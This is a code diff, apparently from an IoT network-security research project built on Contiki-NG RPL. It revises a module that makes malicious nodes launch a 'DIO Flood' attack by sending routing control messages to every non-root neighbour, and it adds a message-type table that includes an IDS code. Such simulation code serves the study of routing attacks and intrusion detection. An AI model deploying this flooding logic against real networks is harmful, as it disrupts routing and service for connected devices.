@@ -4,7 +4,6 @@
 
 /* Initialize RPL ICMPv6 Flooding message handler */
 UIP_ICMP6_HANDLER(flood_handler, ICMP6_RPL, RPL_CODE_FLOOD, flood_input);
-
 /* Init the flood handler */
 void rpl_icmp6_flood_init(){
     uip_icmp6_register_input_handler(&flood_handler);
@@ -15,7 +14,7 @@ void init_flood(){
     flood = true;
     flooding = false;
     init_neighbors_array();
-    dis_sent_flood = 0;
+    dio_sent_flood = 0;
 }
 
 /* Initialize selector node stats */
@@ -23,6 +22,7 @@ void init_select(){
     select = true;
     selecting = false;
     icmp_sent = icmp_dropped = packets_dropped = 0;
+    init_pair_array();
 }
 
 /* Initiliaze the information of the neighbors array */
@@ -33,6 +33,14 @@ void init_neighbors_array(){
     }
 }
 
+void init_pair_array(){
+  pairs[0].message = RPL_CODE_DIS; pairs[0].length = DIS_length;
+  pairs[1].message = RPL_CODE_DIO; pairs[1].length = DIO_length;
+  pairs[2].message = RPL_CODE_DAO; pairs[2].length = DAO_length;
+  pairs[3].message = RPL_CODE_DAO_ACK; pairs[3].length = DAO_ACK_length;
+  pairs[4].message = RPL_CODE_FLOOD; pairs[4].length = FLOOD_length;
+  pairs[5].message = RPL_CODE_IDS; pairs[5].length = IDS_length;
+}
 /* Main input fuction for RPL Flood ICMPv6 messages */
 void flood_input(){
  /* Only necessary for flood attacker nodes*/
@@ -123,33 +131,26 @@ void add_all_nodes(){
             else if (!neighbors[i].used) {
                 neighbors[i].ipaddr = UIP_IP_BUF->srcipaddr;
                 neighbors[i].used = true;
-                char buf[21];
-                uiplib_ipaddr_snprint(buf, sizeof(buf), &neighbors[i].ipaddr);
-                printf("storing: %s\n",buf);
                 return;
             }   
         }
     }
 }
 
-/* Launch the Hello Flood attack */
+/* Launch the DIO Flood attack */
 void launch_flooding_attack(){
       uint8_t i;
-      /*char message[9];
-      strcpy(message,"flooding");*/ 
       uip_ipaddr_t root_ip;
       rpl_dag_get_root_ipaddr(&root_ip);
       for(i=0; i < (uint8_t)( sizeof(neighbors) / sizeof(neighbors[0])); ++i) {
             if (neighbors[i].used) {
                 /* If is not malicious and is not the root --> flood */
                 if (!neighbors[i].malicious && !compare_ip_address(&root_ip, &neighbors[i].ipaddr)) {
-                    //rpl_icmp6_dis_output(&neighbors[i].ipaddr);
-                    rpl_timers_schedule_unicast_dio(rpl_neighbor_get_from_ipaddr(&neighbors[i].ipaddr));
-                    //rpl_icmp6_malicious_output(&neighbors[i].ipaddr, &message, sizeof(message));
-                    char buf[21];
-                    uiplib_ipaddr_snprint(buf, sizeof(buf), &neighbors[i].ipaddr);
-                    printf("sending DIO %d to %s\n",i,buf);
-                    ++dis_sent_flood;
+		    rpl_icmp6_dio_output(&neighbors[i].ipaddr);
+		    char buf[21];
+		    uiplib_ipaddr_snprint(buf, sizeof(buf), &neighbors[i].ipaddr);
+		    printf("sending DIO %d to %s\n",i,buf);
+		    ++dio_sent_flood;
                 }
                 else{
                     char buf[21];
@@ -157,10 +158,8 @@ void launch_flooding_attack(){
                     printf("NOT sending DIO %d to %s\n",i,buf);
                 }
             }
-            else break;
-     }
-     //rpl_timers_schedule_periodic_dis();
-     
+            else return;
+     }     
 }
 
 /* Check if the IP address of the 1st param is malicious */
